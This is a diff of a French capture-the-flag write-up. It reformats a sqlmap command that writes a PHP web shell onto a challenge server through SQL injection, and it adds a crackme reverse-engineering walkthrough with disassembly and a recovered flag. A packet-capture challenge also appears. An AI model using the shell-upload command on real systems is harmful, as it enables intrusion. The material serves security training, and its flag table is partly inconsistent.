@@ -64,7 +64,9 @@ Une fois la faille SQL identifié, nous allons injecter un shell dans le serveur
 	}
 ?>
 
-> sqlmap -u http://blogdemichel.hackdumb.com/?page=blog\&id=1 --file-write="/root/simpleShell.php"--file-dest="../../../../../../tmp/simpleShell.php" 
+> sqlmap -u http://blogdemichel.hackdumb.com/?page=blog\&id=1\
+--file-write="/root/simpleShell.php"\
+--file-dest="../../../../../../tmp/simpleShell.php" 
 ```
 Cette dernière commande `sqlmap` permet d'injecter un fichier local sur le serveur. L'injection de `simpleShell.php` est réalisée dans le dossier `/tmp` afin de ne pas requérir de droit spéciaux. Afin d'atteindre ce dossier on remonte l’arborescence grâce aux multiples `..`.
 Grâce à ce webshell on peux interagir avec le serveur et localiser le flag dans `/home/michel`. A noter qu'on utilise l’exécutable `getflag` qui peut être exécuté par tout les utilisateurs. [[screenshot]](https://raw.githubusercontent.com/migonidec/SRS_CTF/master/images/web/blogMichel/blogMichel_5.PNG).
@@ -82,3 +84,54 @@ On fouillant sur le serveur, on finit par découvrir un executable `runme` qui p
 ### Simple HTTP
 Cette épreuve nous met à disposition une capture de trames où 2 machines échanges des données. 
 On suppose que l'une des trame doit contenir un mot de passe ou un flag. En filtrant les trames par protocole, il est facile de repérer un paquet `HTTP/POST`. En inspectant le contenu de cette trame, on trouve rapidement un fichier `flag.txt` encapsulé un paquet `MIME`.  On trouve donc le flag en clair dans cette partie de la trame [[screenshot]](https://raw.githubusercontent.com/migonidec/SRS_CTF/master/images/forensic/simpleHTTP/simpleHTTP_1.PNG).
+
+## Cracking
+
+### Crackme 01
+La première étape est de récupérer le fichier à examiner et de déterminer sa nature.
+```
+> file ./crack
+crack: ELF 64-but LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64, 
+for GNU/Linux 3.2.0, BuildID[sh1]=31e7ac674a9c314e233a89f5642d4a4219b4794d, not stripped
+```
+On  a donc un exécutable compilé à analyser, regardons son fonctionnement et ce qu'il contient 
+```
+> ./crack
+Need exactly one argument.
+> ./crack testArg
+Fail
+> strings crack
+/lib64/ld-linux-x86-64.so.2
+1N#:
+d-JB
+...
+Need exactly one argument.
+v}p8XnavgNxphgPOHTz{deKU5sDe
+Good flag
+Fail 
+...
+```
+L’exécutable `crack` doit recevoir un argument à sa suite. Grâce à la commande `strings` on peux voir que l'argument est surement le flag de cette épreuve. Malheureusement le flag n'apparait pas en clair dans l’exécutable, cependant une chaine de caractère est à noter `v}p8XnavgNxphgPOHTz{deKU5sDe`.
+Radare2 est un outil de rétro-ingénierie qui permet d'afficher le code assembleur d'un exécutable. Nous allons utiliser [Cutter](https://github.com/radareorg/cutter) qui est une implémentation graphique de Radare2. La particularité de cette implémentation est de pouvoir afficher les blocs d'instructions assembleurs sous la forme de graphique [[screenshot]](https://raw.githubusercontent.com/migonidec/SRS_CTF/master/images/cracking/crackMe/crackMe_1.PNG).
+Nous allons étudier la première action qui est réalisée lorsqu'un argument est entré :
+```
+lea rax, str.v}p8XnavgNxphgPOHTz{deKU5sDe
+mov qword [local_8h], rax
+mov rax, qword [local_20h]
+add rax, 8
+mov rax, qword [rax]
+movzx edx, byte [rax]
+mov rax, qword [local_8h]
+add rax, 6
+movzx eax, byte [rax]
+cmp dl, al
+```
+Malgré la relative obscurité de ce code, nous pouvons déduire que l’exécutable compare la premier caractère de l'entrée au 6eme caractère de la chaine `v}p8XnavgNxphgPOHTz{deKU5sDe`.
+> A noter que la chaine de caractères est numérotée à partir de zéro, le sixième caractère est donc un `a`
+
+Par la suite, le programme compare 1 à 1 tous les caractères de l'entrée (dans l'ordre) avec la chaine de caractères `v}p8XnavgNxphgPOHTz{deKU5sDe` (dans le désordre). En reconstituant l'ordre de comparaison, on peux donc reconstituer la flag de cet exécutable.
+| Ordre de comparaison (hex) | 6 | 14 | 0 | 15 | 5 | 19 | 13 | d | 12 | 9 | 2 |
+|---------------------------|--|--|--|--|--|--|--|--|--|--|--|--|
+| Ordre de comparaison (dec) | 6 | 20 | 0 | 21 | 5 | 25 | 19 | 13 | 18 | 9 | 2 |
+| Flag | a | d | v | e | n | s | { | g | z | N | p |
+En suivant ce processus on peux facilement reconstituer le flag de cette épreuve `advens{gzNpgOhXpKe5x8DvPTHU}`
